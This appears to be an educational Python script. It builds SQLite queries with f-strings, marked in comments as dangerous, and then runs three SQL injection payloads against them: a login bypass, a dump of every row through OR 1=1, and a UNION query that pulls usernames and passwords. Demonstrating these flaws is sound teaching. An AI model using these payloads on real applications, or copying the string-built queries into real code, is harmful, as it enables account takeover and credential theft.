import sqlite3

def search_product(name):
    conn = sqlite3.connect('nyondo_stock.db')
    # DANGER: Using f-strings to build a query is a huge security risk!
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f"Executing: {query}")
    
    rows = conn.execute(query).fetchall()
    conn.close()
    return rows

def login(username, password):
    conn = sqlite3.connect('nyondo_stock.db')
    # DANGER: Directly inserting strings into the login query
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    print(f"Executing: {query}")
    
    user = conn.execute(query).fetchone()
    conn.close()
    return user

# --- TEST ATTACKS BELOW ---

print("\n--- Attack 1: Bypass Login (Admin) ---")
# The '--' tells SQL to ignore the rest of the line (the password check)
hacker_user = login("admin'--", "wrong_password")
print(f"Logged in as: {hacker_user}")

print("\n--- Attack 2: Dump All Products ---")
# The ' OR 1=1 makes the condition always true
all_products = search_product("' OR 1=1--")
for p in all_products: print(p)

print("\n--- Attack 3: Steal User Passwords via Product Search ---")
# This uses UNION to pull data from a different table entirely
stolen_data = search_product("' UNION SELECT id, username, password, role FROM users--")
for s in stolen_data: print(s)